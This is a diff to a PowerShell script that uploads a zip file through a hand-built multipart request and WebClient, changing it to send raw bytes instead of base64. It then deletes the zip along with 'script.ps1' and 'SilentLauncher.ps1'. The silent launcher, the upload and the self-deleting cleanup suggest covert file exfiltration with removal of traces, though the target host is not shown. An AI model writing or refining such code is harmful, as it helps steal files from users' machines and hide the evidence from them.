@@ -19,21 +19,30 @@ $encoding = [System.Text.Encoding]::UTF8
 $multipartContentType = "multipart/form-data; boundary=$boundary"
 $contentDisposition = "form-data; name=`"file`"; filename=`"$($zipFilePath | Split-Path -Leaf)`""
 
-# Read the file content
-$fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
-$encodedFileContent = [System.Convert]::ToBase64String($fileContent)
-
-# Build the request body
+# Build the request body with file content directly
 $bodyLines = @(
     "--$boundary",
     "Content-Disposition: $contentDisposition",
     "Content-Type: application/octet-stream$LF",
-    $encodedFileContent,
+    [System.IO.File]::ReadAllBytes($zipFilePath),
     "--$boundary--"
-) -join $LF
+)
 
 # Convert the body to a byte array
-$bodyBytes = $encoding.GetBytes($bodyLines)
+$body = New-Object System.IO.MemoryStream
+$writer = New-Object System.IO.BinaryWriter $body
+foreach ($line in $bodyLines) {
+    if ($line -is [byte[]]) {
+        $writer.Write($line, 0, $line.Length)
+        $writer.Write($encoding.GetBytes($LF), 0, $encoding.GetByteCount($LF))
+    } else {
+        $writer.Write($encoding.GetBytes($line + $LF))
+    }
+}
+$writer.Flush()
+$bodyBytes = $body.ToArray()
+$body.Dispose()
+$writer.Dispose()
 
 # Create the WebClient object
 $webClient = New-Object System.Net.WebClient
@@ -57,6 +66,7 @@ finally {
 $filesToDelete = @(
     "$zipFilePath",
     "C:\Users\$currentUser\script.ps1",
+    "C:\Users\$currentUser\$currentUser",
     "C:\Users\$currentUser\SilentLauncher.ps1"
 )
 
